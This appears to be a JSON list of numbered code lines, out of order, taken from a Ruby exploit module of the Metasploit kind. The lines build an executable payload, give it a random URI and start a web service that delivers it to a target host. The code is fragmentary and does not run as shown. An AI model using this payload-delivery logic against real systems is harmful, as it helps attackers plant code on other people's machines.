[
    {
        "line": 2,
        "fullcodeline": "@pl = generate_payload_exe"
    },
    {
        "line": 3,
        "fullcodeline": "@elf_sent = false"
    },
    {
        "line": 5,
        "fullcodeline": "downfile = rand_text_alpha(8+rand(8))"
    },
    {
        "line": 6,
        "fullcodeline": "resource_uri = '/' + downfile"
    },
    {
        "line": 20,
        "fullcodeline": "@service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri"
    },
    {
        "line": 21,
        "fullcodeline": "service_url_payload = srv_host + resource_uri"
    },
    {
        "line": 23,
        "fullcodeline": "print_status(\"#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...\")"
    },
    {
        "line": 24,
        "fullcodeline": "start_service({'Uri' => {"
    },
    {
        "line": 14,
        "fullcodeline": "if (datastore['SRVHOST'] == \"0.0.0.0\" or datastore['SRVHOST'] == \"::\")"
    },
    {
        "line": 10,
        "fullcodeline": "ssl_restore = true"
    },
    {
        "line": 11,
        "fullcodeline": "datastore['SSL'] = false"
    },
    {
        "line": 15,
        "fullcodeline": "srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)"
    },
    {
        "line": 17,
        "fullcodeline": "srv_host = datastore['SRVHOST']"
    },
    {
        "line": 31,
        "fullcodeline": "datastore['SSL'] = true if ssl_restore"
    },
    {
        "line": 25,
        "fullcodeline": "'Proc' => Proc.new { |cli, req|"
    },
    {
        "line": 28,
        "fullcodeline": "'Path' => resource_uri"
    }
]